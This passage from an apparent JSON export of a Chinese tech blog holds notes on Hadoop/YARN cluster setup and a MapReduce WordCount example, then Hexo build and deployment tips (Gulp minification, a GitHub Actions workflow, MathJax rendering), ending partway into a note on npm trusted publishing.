&lt;value&gt;4096&lt;/value&gt; &lt;/property&gt; &lt;!-- 开启 hdfs 的垃圾桶机制，删除掉的数据可以从垃圾桶中回收，单位分钟 --&gt; &lt;property&gt; &lt;name&gt;fs.trash.interval&lt;/name&gt; &lt;value&gt;10080&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改 hdfs-site.xml第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim hdfs-site.xml hdfs-site.xml&lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.secondary.http-address&lt;/name&gt; &lt;value&gt;node01:50090&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.http-address&lt;/name&gt; &lt;value&gt;node01:50070&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.name.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop2.7.5/hadoopDatas/namenodeDatas,file:///export/servers/hadoop2.7.5/hadoopDatas/namenodeDatas2&lt;/value&gt; &lt;/property&gt; &lt;!-- 定义 dataNode 数据存储的节点位置，实际工作中，一般先确定磁盘的挂载目录，然后多个目录用，进行分割 --&gt; &lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop2.7.5/hadoopDatas/datanodeDatas,file:///export/servers/hadoop2.7.5/hadoopDatas/datanodeDatas2&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.edits.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop2.7.5/hadoopDatas/nn/edits&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.checkpoint.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop2.7.5/hadoopDatas/snn/name&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.checkpoint.edits.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop2.7.5/hadoopDatas/dfs/snn/edits&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;3&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.permissions&lt;/name&gt; &lt;value&gt;false&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.blocksize&lt;/name&gt; &lt;value&gt;134217728&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改 hadoop-env.sh第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim hadoop-env.sh hadoop-env.shexport JAVA_HOME=/export/servers/jdk1.8.0_141 修改 mapred-site.xml第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim mapred-site.xml mapred-site.xml&lt;configuration&gt; &lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;mapreduce.job.ubertask.enable&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.address&lt;/name&gt; &lt;value&gt;node01:10020&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.webapp.address&lt;/name&gt; &lt;value&gt;node01:19888&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改 yarn-site.xml第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim yarn-site.xml yarn-site.xml&lt;configuration&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.hostname&lt;/name&gt; &lt;value&gt;node01&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.log-aggregation-enable&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.log-aggregation.retain-seconds&lt;/name&gt; &lt;value&gt;604800&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改 mapred-env.sh第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim mapred-env.sh mapred-env.shexport JAVA_HOME=/export/servers/jdk1.8.0_141 修改 slaves第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim slaves slaveslocalhost 第三步：启动集群要启动 Hadoop 集群，需要启动 HDFS 和 YARN 两个模块。注意： 首次启动 HDFS 时，必须对其进行格式化操作。 本质上是一些清理和准备工作，因为此时的 HDFS 在物理上还是不存在的。 cd /export/servers/hadoop-2.7.5/binhdfs namenode -format 启动命令：创建数据存放文件夹第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5mkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/tempDatasmkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/namenodeDatasmkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/namenodeDatas2mkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/datanodeDatasmkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/datanodeDatas2mkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/nn/editsmkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/snn/namemkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/dfs/snn/edits 准备启动第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/sbin/start-dfs.sh sbin/start-yarn.sh sbin/mr-jobhistory-daemon.sh start historyserver 三个端口查看界面 http://192.168.52.100:50070/explorer.html#/ 查看 hdfs 绿色的！ http://192.168.52.100:8088/cluster 查看 yarn 集群 http://192.168.52.100:19888/jobhistory 查看历史完成的任务"},{"title":"","date":"2019-09-19T08:39:00.000Z","updated":"2022-05-12T00:46:00.000Z","comments":true,"path":"notes/Hadoop/wordcount.html","permalink":"https://blog.mhuig.top/notes/Hadoop/wordcount","excerpt":"","text":"MapReduce WordCount 大数据处理技术 -Hadoop-MapReduce 编程模型 - WordCount 实例分析 WordCount 示例编写需求：在一堆给定的文本文件中统计输出每一个单词出现的总次数数据格式准备如下： hadoop,hive,hbasehive,stormhive,hbase,kafkaspark,flume,kafka,stormhbase,hadoop,hbasehive,spark,storm 定义 mapper 类WordCountMapper.javapackage com.qst.wordcount;import org.apache.hadoop.io.IntWritable;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Mapper;import java.io.IOException;/*** mapper 类继承 Mapper 表示我们的这个 class 类是一个标准的 mapper 类，需要四个泛型* k1 v1 k2 v2*/public class WordCountMapper extends Mapper&lt;LongWritable,Text,Text,IntWritable&gt;{ Text text = new Text(); IntWritable intWritable = new IntWritable(); /** * 覆写父类的 map 方法，每一行数据要调用一次 map 方法，我们的处理逻辑都写在这个 map 方法里面 * @param key * @param value * @param context * @throws IOException * @throws InterruptedException * hdfs 的最原始数据 hadoop,hive,hbase hive,storm hive,hbase,kafka spark,flume,kafka,storm hbase,hadoop,hbase hive,spark,storm 经过第一步：TextInputFormat 之后 0 hadoop,hive,hbase 17 hive,storm 27 hive,hbase,kafka */ /** * @param key 我们的 key1 行偏移量 ，一般没啥用，直接可以丢掉 * @param value 我们的 value1 行文本内容，需要切割，然后转换成新的 k2 v2 输出 * @param context 上下文对象，承接上文，把数据传输给下文 * @throws IOException * @throws InterruptedException */ @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException { /* hadoop,hive,hbase hive,storm hive,hbase,kafka spark,flume,kafka,storm hbase,hadoop,hbase hive,spark,storm */ String line = value.toString(); String[] split = line.split(\",\"); //遍历我们切割出来的单词 for (String word : split) { text.set(word); intWritable.set(1); //写出我们的 k2 v2 这里的类型跟我们的 k2 v2 保持一致 context.write(text,intWritable); } }} 定义 reducer 类WordCountReducer.javapackage com.qst.wordcount;import org.apache.hadoop.io.IntWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Reducer;import java.io.IOException;/*** 我们自定的 class 类继承 reducer 类表明我们这是一个标准的 reducer 类* 跟我们的 k2 v2 k3 v3 四个泛型*/public class WordCountReducer extends Reducer&lt;Text,IntWritable,Text,IntWritable&gt;{ /** * 覆写 reduce 方法， * @param key 接收的 key 是我们的 K2 * @param values 接收到 value 是一个集合 集合里面的数据类型是 v2 类型 * @param context 上下文对象，将我们的数据往外写 * @throws IOException * @throws InterruptedException */ /* hadoop,hive,hbase hive,storm hive,hbase,kafka spark,flume,kafka,storm hbase,hadoop,hbase hive,spark,storm hadoop &lt;1,1&gt; hive &lt;1,1,1,1&gt; hbase&lt;1,1,1&gt; */ @Override protected void reduce(Text key, Iterable&lt;IntWritable&gt; values, Context context) throws IOException, InterruptedException { int a = 0; for (IntWritable value : values) { int i = value.get(); a += i; } //将我们的数据写出去 context.write(key,new IntWritable(a)); }} 定义 main 方法jobMain.javapackage com.qst.wordcount;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.conf.Configured;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.IntWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.lib.input.TextInputFormat;import org.apache.hadoop.mapreduce.lib.output.TextOutputFormat;import org.apache.hadoop.util.Tool;import org.apache.hadoop.util.ToolRunner;public class JobMain extends Configured implements Tool { @Override public int run(String[] args) throws Exception { //获取一个 job 对象，用于我们任务的组织，通过 job 对象将我们八个步骤组织到一起，提交给 yarn 集群运行 Job job = Job.getInstance(super.getConf(), \"xxx\"); //如果需要打包运行，一定得要加上这一句 job.setJarByClass(JobMain.class); //获取到我们的 job 对象之后，通过 job 对象来组织我们的八个 class 类到一起，然后提交给 yarn 集群运行即可 //第一步：读取文件，解析成 key,value 对，这里是 k1 v1 job.setInputFormatClass(TextInputFormat.class); //集群运行模式，从 hdfs 上面读取文件 // TextInputFormat.addInputPath(job,new Path(\"hdfs://node01:8020/wordcount\")); //使用本地模式来运行，从本地磁盘读取文件进行处理 TextInputFormat.addInputPath(job,new Path(\"file:///F:\\\\input\")); //第二步：自定义 map 逻辑，接收第一步的 k1,v1 转换成新的 k2 v2 进行输出 job.setMapperClass(WordCountMapper.class); //设置我们 key2 的类型 job.setMapOutputKeyClass(Text.class); //设置我们的 v2 类型 job.setMapOutputValueClass(IntWritable.class); /** * 第三到六步 * 第三步：分区 相同 key 的 value 发送到同一个 reduce 里面去，形成一个集合 * 第四步：排序 * 第五步：规约 * 第六步：分组 * 都省掉 */ //第七步：设置我们的 reduce 类，接受我们的 key2 v2 输出我们 k3 v3 job.setReducerClass(WordCountReducer.class); //设置我们 key3 输出的类型 job.setOutputKeyClass(Text.class); //设置我们 value3 的输出类型 job.setOutputValueClass(IntWritable.class); //第八步：设置我们的输出类 outputformat job.setOutputFormatClass(TextOutputFormat.class); //输出路径输出到 hdfs 上面去，表示我打包到集群上面去运行 // TextOutputFormat.setOutputPath(job,new Path(\"hdfs://node01:8020/wordcountout\")); //使用本地模式来运行 TextOutputFormat.setOutputPath(job,new Path(\"file:///F:\\\\output\")); //提交我们的任务 boolean b = job.waitForCompletion(true); return b?0:1; } public static void main(String[] args) throws Exception { Configuration configuration = new Configuration(); //提交我们的 job 任务 //任务完成之后，返回一个状态码值，如果状态码值是 0，表示程序运 行成功 int run = ToolRunner.run(configuration, new JobMain(), args); System.exit(run); }} 提醒：本地运行完成之后，就可以打成 jar 包放到服务器上面去运行了，实际工作当中，都是将代码打成 jar 包，开发 main 方法作为程序的入口，然后放到集群上面去运行"},{"title":"","date":"2019-09-19T08:40:00.000Z","updated":"2022-05-12T02:47:00.000Z","comments":true,"path":"notes/Hadoop/yarn.html","permalink":"https://blog.mhuig.top/notes/Hadoop/yarn","excerpt":"","text":"Yarn 资源调度 大数据处理技术 -Hadoop-Yarn 资源调度 yarn 集群的监控管理界面：http://192.168.52.100:8088/clusterjobHistoryServer 查看界面：http://192.168.52.100:19888/jobhistory yarn 的介绍yarn 是 hadoop 集群当中的资源管理系统模块，从 hadoop2.x 开始引入 yarn 来进 行管理集群当中的资源（主要是服务器的各种硬件资源，包括 CPU，内存，磁盘，网络 IO 等）以及运行在 yarn 上面的各种任务。总结一句话就是说：yarn 主要就是为了调度资源，管理任务等其调度分为两个层级来说： 一级调度管理： 计算资源管理 (CPU, 内存，网络 IO，磁盘) 硬件的资源 App 生命周期管理（每一个应用执行的情况，都需要汇报给 ResourceManager） 二级调度管理： App 内部的计算模型管理 (AppMaster 的任务精细化管理) job 任务 多样化的计算模型 yarn 的官网文档说明：http://hadoop.apache.org/docs/r2.7.5/hadoop-yarn/hadoop-yarn-site/YARN.html Yarn 的主要组件介绍与作用yarn 当中的各个主要组件的介绍ResourceManager：yarn 集群的主节点，主要用于接收客户端提交的任务，并对任务进行分配。NodeManager：yarn 集群的从节点，主要用于任务的计算ApplicationMaster： 当 有 新 的 任 务 提 交 到 ResourceManager 的 时候，ResourceManager 会在某个从节点 nodeManager 上面启动一个 ApplicationMaster 进程，负责这个任务执行的资源的分配，任务的生命周期的监控等Container：资源的分配单位，ApplicationMaster 启动之后，与 ResourceManager 进行通信，向 ResourceManager 提出资源申请的请求，然后 ResourceManager 将资源分配给 ApplicationMaster，这些资源的表示，就是一个个的 container JobHistoryServer：这是 yarn 提供的一个查看已经完成的任务的历史日志记录的服务，我们可以启动 jobHistoryServer 来观察已经完成的任务的所有详细日志信息TimeLineServer：hadoop2.4.0 以后出现的新特性，主要是为了监控所有运行在 yarn 平台上面的所有任务（例如 MR，Storm，Spark，HBase 等等） yarn 的发展历程以及详细介绍：https://www.ibm.com/developerworks/cn/opensource/os-cn-hadoop-yarn/ yarn 当中各个主要组件的作用resourceManager 主要作用： 处理客户端请求 启动 / 监控 ApplicationMaster 监控 NodeManager 资源分配与调度 NodeManager 主要作用： 单个节点上的资源管理和任务管理 接收并处理来自 resourceManager 的命令 接收并处理来自 ApplicationMaster 的命令 管理抽象容器 container 定时向 RM 汇报本节点资源使用情况和各个 container 的运行状态 ApplicationMaster 主要作用： 数据切分 为应用程序申请资源 任务监控与容错 负责协调来自 ResourceManager 的资源，开通 NodeManager 监视容的执 行和资源使用（CPU, 内存等的资源分配） Container 主要作用： 对任务运行环境的抽象 任务运行资源（节点，内存，cpu） 任务启动命令 任务运行环境 yarn 的架构 yarn 当中的调度器yarn 我们都知道主要是用于做资源调度，任务分配等功能的，那么在 hadoop 当中，究竟使用什么算法来进行任务调度就需要我们关注了，hadoop 支持好几种任务的调度方式，不同的场景需要使用不同的任务调度器 FIFO Scheduler第一种调度器：FIFO Scheduler （队列调度器） 把应用按提交的顺序排成一个队列，这是一个先进先出队列，在进行资源分配的时候，先给队列中最头上的应用进行分配资源，待最头上的应用需求满足后再给下一个分配，以此类推。FIFO Scheduler 是最简单也是最容易理解的调度器，也不需要任何配置，但它并不适用于共享集群。大的应用可能会占用所有集群资源，这就导致其它应用被阻塞。在共享集群中，更适合采用 Capacity Scheduler 或 Fair Scheduler，这两个调度器都允许大任务和小任务在提交的同时获得一定的系统资源。 Capacity Scheduler第二种调度器：capacity scheduler（容量调度器，apache 版本默认使用的调度器） Capacity 调度器允许多个组织共享整个集群，每个组织可以获得集群的一部分计算能力。通过为每个组织分配专门的队列，然后再为每个队列分配一定的集群资源，这样整个集群就可以通过设置多个队列的方式给多个组织提供服务了。除此之外，队列内部又可以垂直划分，这样一个组织内部的多个成员就可以共享这个队列资源了，在一个队列内部，资源的调度是采用的是先进先出 (FIFO) 策略。 Fair Scheduler第三种调度器：Fair Scheduler（公平调度器，CDH 版本的 hadoop 默认使用的调度器） Fair 调度器的设计目标是为所有的应用分配公平的资源（对公平的定义可以通过参数来设置）。公平调度在也可以在多个队列间工作。举个例子，假设有两个用户 A 和 B，他们分别拥有一个队列。当 A 启动一个 job 而 B 没有任务时，A 会获得全部集群资源；当 B 启动一个 job 后，A 的 job 会继续运行，不过一会儿之后两个任务会各自获得一半的集群资源。如果此时 B 再启动第二个 job 并且其它 job 还在运行，则它将会和 B 的第一个 job 共享 B 这个队列的资源，也就是 B 的两个 job 会用于四分之一的集群资源，而 A 的 job 仍然用于集群一半的资源，结果就是资源最终在两个用户之间平等的共享 使用哪种调度器取决于 yarn-site.xml 当中的 yarn.resourcemanager.scheduler.class 这个属性的配置 yarn 常用参数设置 第一个参数：container 分配最小内存yarn.scheduler.minimum-allocation-mb 1024给应用程序 container 分配的最小内存 第二个参数：container 分配最大内存yarn.scheduler.maximum-allocation-mb 8192给应用程序 container 分配的最大内存 第三个参数：每个 container 的最小虚拟内核个数yarn.scheduler.minimum-allocation-vcores 1每个 container 默认给分配的最小的虚拟内核个数 第四个参数：每个 container 的最大虚拟内核个数yarn.scheduler.maximum-allocation-vcores 32每个 container 可以分配的最大的虚拟内核的个数 第五个参数：nodeManager 可以分配的内存大小yarn.nodemanager.resource.memory-mb 8192nodemanager 可以分配的最大内存大小，默认 8192Mb 在我们浏览 yarn 的管理界面的时候会发现一个问题 我们可以在 yarn-site.xml 当中修改以下两个参数来改变默认值 定义每台机器的内存使用大小yarn.nodemanager.resource.memory-mb 8192 定义每台机器的虚拟内核使用大小yarn.nodemanager.resource.cpu-vcores 8 定义交换区空间可以使用的大小（交换区空间就是讲一块硬盘拿出来做内存使用）这里指定的是 nodemanager 的 2.1 倍yarn.nodemanager.vmem-pmem-ratio 2.1"},{"title":"","date":"2018-10-30T02:27:00.000Z","updated":"2025-10-30T02:27:00.000Z","comments":true,"path":"notes/Hexo/2.html","permalink":"https://blog.mhuig.top/notes/Hexo/2","excerpt":"","text":"使用 Gulp 对 Hexo 静态资源进行压缩 使用 Gulp 对 Hexo 静态资源进行压缩 资源依赖使用 npm install --save-dev 安装依赖包。 package.json\"devDependencies\": { \"@babel/core\": \"^7.28.4\", \"@babel/preset-env\": \"^7.28.3\", \"gulp\": \"^5.0.1\", \"gulp-babel\": \"^8.0.0\", \"gulp-clean-css\": \"^4.3.0\", \"gulp-html-minifier-terser\": \"^7.1.0\", \"gulp-htmlclean\": \"^2.7.22\", \"gulp-htmlmin\": \"^5.0.1\", \"gulp-sourcemaps\": \"^3.0.0\", \"gulp-terser\": \"^2.1.0\" } 压缩 CSS 文件// 压缩css文件const minify_css = () =&gt; ( gulp.src(['./public/**/*.css', '!./public/{lib,lib/**}', '!./public/{libs,libs/**}', '!./public/{media,media/**}']) .pipe(sourcemaps.init()) .pipe(cleanCSS({ compatibility: 'ie8' })) .pipe(sourcemaps.write('./maps')) .pipe(gulp.dest('./public'))); 压缩 JS 文件// 压缩html文件const minify_html = () =&gt; ( gulp.src(['./public/**/*.html', '!./public/{lib,lib/**}', '!./public/{libs,libs/**}', '!./public/{media,media/**}']) .pipe(htmlclean()) .pipe(htmlmin({ removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, })) .pipe(gulp.dest('./public'))) 压缩 HTML 文件// 压缩html文件const minify_html = () =&gt; ( gulp.src(['./public/**/*.html', '!./public/{lib,lib/**}', '!./public/{libs,libs/**}', '!./public/{media,media/**}']) .pipe(htmlclean()) .pipe(htmlmin({ removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, })) .pipe(gulp.dest('./public'))) 调用gulp.task('minify', gulp.parallel( minify_html, minify_css, minify_js))gulp.task('default', gulp.series('minify')); 完整压缩脚本gulpfile.jsconst gulp = require('gulp');const cleanCSS = require('gulp-clean-css');const htmlmin = require('gulp-html-minifier-terser');const htmlclean = require('gulp-htmlclean');const terser = require('gulp-terser');const sourcemaps = require('gulp-sourcemaps');const babel = require('gulp-babel');// 压缩css文件const minify_css = () =&gt; ( gulp.src(['./public/**/*.css', '!./public/{lib,lib/**}', '!./public/{libs,libs/**}', '!./public/{media,media/**}']) .pipe(sourcemaps.init()) .pipe(cleanCSS({ compatibility: 'ie8' })) .pipe(sourcemaps.write('./maps')) .pipe(gulp.dest('./public')));// 压缩html文件const minify_html = () =&gt; ( gulp.src(['./public/**/*.html', '!./public/{lib,lib/**}', '!./public/{libs,libs/**}', '!./public/{media,media/**}']) .pipe(htmlclean()) .pipe(htmlmin({ removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, })) .pipe(gulp.dest('./public')))// 压缩js文件const minify_js = () =&gt; ( gulp.src(['./public/**/*.js', '!./public/**/*.min.js', '!./public/{lib,lib/**}', '!./public/{libs,libs/**}', '!./public/{media,media/**}']) .pipe(sourcemaps.init()) .pipe(babel({ presets: ['@babel/preset-env'] })) .pipe(terser({ ecma: 2015, ie8: true, safari10: true, output: { comments: false } })) .pipe(sourcemaps.write('./maps')) .pipe(gulp.dest('./public')))gulp.task('minify', gulp.parallel( minify_html, minify_css, minify_js))gulp.task('default', gulp.series('minify')); 相关文档参考文档： gulp gulp-html-minifier-terser gulp-htmlclean gulp-htmlmin gulp-clean-css gulp-terser gulp-sourcemaps gulp-babel"},{"title":"","date":"2018-10-30T02:26:00.000Z","updated":"2025-10-30T02:26:00.000Z","comments":true,"path":"notes/Hexo/1.html","permalink":"https://blog.mhuig.top/notes/Hexo/1","excerpt":"","text":"关于 Hexo 的文档链接 关于 Hexo 的文档链接 Hexo 生态的核心文档与资源分布在官方指南、热门主题社区和第三方教程中。 官方核心资源Hexo 官方文档（中文支持）：涵盖安装、配置、命令详解等基础操作，是所有开发者的起点。无论是初始化博客（hexo init）还是部署流程，官方指南都提供权威说明。 https://hexo.io/zh-cn/docs/ Volantis 主题官方文档： https://volantis.js.org 问题排查与社区GitHub Issues：Hexo 核心仓库的Issues 区和 Volantis 主题仓库的 Issues 区，是解决问题的首选。 Stack Overflow：搜索关键词 hexo + 问题描述，例如 hexo deploy 404 error，通常能找到现成解决方案。"},{"title":"","date":"2018-10-30T02:28:00.000Z","updated":"2025-10-30T02:28:00.000Z","comments":true,"path":"notes/Hexo/3.html","permalink":"https://blog.mhuig.top/notes/Hexo/3","excerpt":"","text":"使用 Github Actions 部署 Hexo 使用 Github Actions 部署 Hexo 事件触发器on: workflow_dispatch: push: branches: - main 检出仓库分支源码- name: Checkout Repository main branch uses: actions/checkout@v3 with: submodules: \"true\" 安装 Node.js- name: Setup Node.js 24.x uses: actions/setup-node@main with: node-version: 24 registry-url: https://registry.npmjs.org 安装部署密钥- name: Setup Deploy Private Key env: DEPLOY_KEY: ${{ secrets.TOKEN }} NAME: ${{ secrets.NAME }} EMAIL: ${{ secrets.EMAIL }} run: | mkdir -p ~/.ssh/ echo \"$DEPLOY_KEY\" &gt; ~/.ssh/id_rsa chmod 600 ~/.ssh/id_rsa ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts git config --global user.email \"$EMAIL\" git config --global user.name \"$NAME\" 缓存 node modules- name: Cache node modules uses: actions/cache@v4 id: cache with: path: node_modules key: ${{ runner.os }}-node-${{ hashFiles('**/package.json') }} restore-keys: | ${{ runner.os }}-node- 安装依赖- name: Install Dependencies if: steps.cache.outputs.cache-hit != 'true' run: | npm install 生成站点静态资源- name: Generate Public Files run: | # Restore last modified time git ls-files -z | while read -d '' path; do touch -d \"$(git log -1 --format=\"@%ct\" \"$path\")\" \"$path\"; done hexo clean &amp;&amp; hexo g 部署到 Github Pages- name: Deploy Github uses: peaceiris/actions-gh-pages@v3 with: deploy_key: ${{ secrets.TOKEN }} publish_dir: ./public user_name: \"github-actions[bot]\" user_email: \"github-actions[bot]@users.noreply.github.com\" external_repository: XXX/XXX.github.io publish_branch: main 完整 Actions 脚本.github/workflows/DeployToGithubPages.ymlname: Deploy To Github Pageson: workflow_dispatch: push: branches: - mainjobs: deploy: if: ${{ contains(github.event.head_commit.message, 'draft')!= true }} name: Deploy Hexo Public To Pages runs-on: ubuntu-latest env: TZ: Asia/Shanghai steps: - name: Checkout Repository main branch uses: actions/checkout@v3 with: submodules: \"true\" - name: Setup Node.js 24.x uses: actions/setup-node@main with: node-version: 24 registry-url: https://registry.npmjs.org - name: Setup Deploy Private Key env: DEPLOY_KEY: ${{ secrets.TOKEN }} NAME: ${{ secrets.NAME }} EMAIL: ${{ secrets.EMAIL }} run: | mkdir -p ~/.ssh/ echo \"$DEPLOY_KEY\" &gt; ~/.ssh/id_rsa chmod 600 ~/.ssh/id_rsa ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts git config --global user.email \"$EMAIL\" git config --global user.name \"$NAME\" - name: Install Globel Dependencies run: | npm install hexo-cli -g - name: Cache node modules uses: actions/cache@v4 id: cache with: path: node_modules key: ${{ runner.os }}-node-${{ hashFiles('**/package.json') }} restore-keys: | ${{ runner.os }}-node- - name: Install Dependencies if: steps.cache.outputs.cache-hit != 'true' run: | npm install - name: Generate Public Files run: | # Restore last modified time git ls-files -z | while read -d '' path; do touch -d \"$(git log -1 --format=\"@%ct\" \"$path\")\" \"$path\"; done hexo clean &amp;&amp; hexo g - name: Deploy Github uses: peaceiris/actions-gh-pages@v3 with: deploy_key: ${{ secrets.TOKEN }} publish_dir: ./public user_name: \"github-actions[bot]\" user_email: \"github-actions[bot]@users.noreply.github.com\" external_repository: XXX/XXX.github.io publish_branch: main 相关文档https://docs.github.com/zh/actions"},{"title":"","date":"2018-10-30T02:29:00.000Z","updated":"2025-10-30T02:29:00.000Z","comments":true,"path":"notes/Hexo/4.html","permalink":"https://blog.mhuig.top/notes/Hexo/4","excerpt":"","text":"Open Search Open Search 第一步用本站举例：先在浏览器地址栏输入本站的域名 第二步按 Tab 键 第三步输入值就能进行搜索了 相关文档https://developer.mozilla.org/zh-CN/docs/Web/XML/Guides/OpenSearch"},{"title":"","date":"2018-10-24T02:29:00.000Z","updated":"2025-10-24T02:29:00.000Z","comments":true,"path":"notes/Hexo/5.html","permalink":"https://blog.mhuig.top/notes/Hexo/5","excerpt":"","text":"如何在 Volantis 主题上优雅地书写数学公式 如何在 Volantis 主题上优雅地书写数学公式 数学公式渲染引擎选择MathJax 方案（兼容性优先）适合需要完整 LaTeX 支持的场景，尤其推荐用于学术类内容。 KaTeX 方案（性能优先）适合追求加载速度的场景，KaTeX 渲染速度比 MathJax 快约 60%，但对部分复杂公式支持有限。 Volantis 主题内置前端渲染方案Volantis 6 中在 front-matter 中配置页面插件... 即可。 front-matter---plugins: - mathjax - katex--- 例如： example.md:---title: 渲染公式（MathJax）date: 2025-10-25plugins: - mathjax---添加一段描述性文字&lt;!-- more --&gt;$$\\eta(s) = (1-2^{1-s})\\zeta(s)$$ 数学公式的语法冲突这里以 Mathjax 为例： Mathjax 与 Markdown 的语法冲突MathJax 与 Markdown 的语法冲突源于两者部分符号的语义重叠，如 _（Markdown 斜体 vs LaTeX 下标）、*（Markdown 粗体 vs LaTeX 星号）和 \\（Markdown 转义符 vs LaTeX 命令前缀）。例如，公式 x_i 可能被 Markdown 引擎误解析为 &lt;em&gt;i&lt;/em&gt; 标签，导致 MathJax 无法识别。 一种方法是使用 \\ 转义这些冲突的部分符号。例如：对于多行公式中的换行 \\\\ ，需要转义成 \\\\\\\\ 。 另一种方法是逆向渲染流程，先让 MathJax 解析公式，再用 Markdown 引擎处理文本。由于理论上 MathJax 生成的 HTML 不含 Markdown 语法，可从根本上避免冲突。 还有一种方案是修改 Markdown 引擎规则，移除语义重叠的部分。 极端的方案是直接使用图片。 Mathjax 与 Nunjucks 的语法冲突Nunjucks 是 Hexo 内置的模板语法。 Nunjucks 模板引擎与 MathJax 的语法冲突主要源于两者对特殊字符的解析规则重叠。 符号优先级冲突： MathJax 的 _（下标）和 ^（上标）会被 Nunjucks 误认为模板语法的一部分。例如 x_i 可能被解析为变量 i 的属性，而非数学符号 x_i 。类似地， \\frac{1}{2} 中的反斜杠可能被 Nunjucks 转义为普通字符，导致 MathJax 无法识别分式结构。 模板变量标识符冲突： MathJax 的某些分隔符（如 `$$..$$` ）虽然与 Nunjucks 的 `{{ }}` 不直接重叠，但复杂公式中嵌套的大括号 `{ }` 可能触发模板引擎的语法检查错误，尤其在未正确转义时。 一种解决方法是加空格，例如在两个连续的大括号之间加入空格。 另一种解决方法是在公式前后添加 Nunjucks 的 raw 标签，使模板引擎跳过对中间内容的解析： {% raw %}$$ E=mc^2 $$ &lt;!-- 不受 Nunjucks 影响的公式 --&gt;{% endraw %} 这种解决方法适用于单页少量公式，无需修改全局配置。缺点是侵入式语法，降低文档可移植性。 第三方插件数学公式渲染器的选择第三方数学公式渲染器插件需要配套使用对应的 markdown 渲染器才能解决语义重叠冲突的问题。 以下是推荐的组合： marked对于 hexo-renderer-marked 配套使用 hexo-xmath 。 或者直接使用懒人包 hexo-xm ，开箱即用。 pandoc对于 hexo-renderer-pandoc 配套使用 hexo-filter-mathjax 。 使用 pandoc 正确渲染多行 MathJax 公式 markdown-it对于 hexo-renderer-markdown-it-plus 配套使用 @iktakahiro/markdown-it-katex 。"},{"title":"","date":"2025-11-01T08:08:00.000Z","updated":"2025-11-01T08:29:00.000Z","comments":true,"path":"notes/Hexo/6.html","permalink":"https://blog.mhuig.top/notes/Hexo/6","excerpt":"","text":"如何配置可信发布从 CI / CD 工作流发布 npm 包 如何配置可信发布从 CI / CD 工作流发布 npm 包 npm 令牌泄露导致的问题长寿命或永久 npm 令牌是供应链攻击的主要载体。 npm 生态长期存在的供应链安全问题。2025 年 “沙虫” 攻击等事件显示，超 30% 的恶意包发布源于令牌泄露。 实时更新：Shai-Hulud，影响 CrowdStrike 和数百个热门软件包的历史上最危险的 NPM 漏洞 GlassWorm：第一个使用隐形代码的自传播蠕虫登陆 OpenVSX 市场 npm 将逐渐弃用之前的经典令牌和 TOTP 2FA npm notice SECURITY NOTICE: Breaking changes starting October 13, 2025. New tokens will be limited to a maximum lifetime of 90 days, and TOTP setup 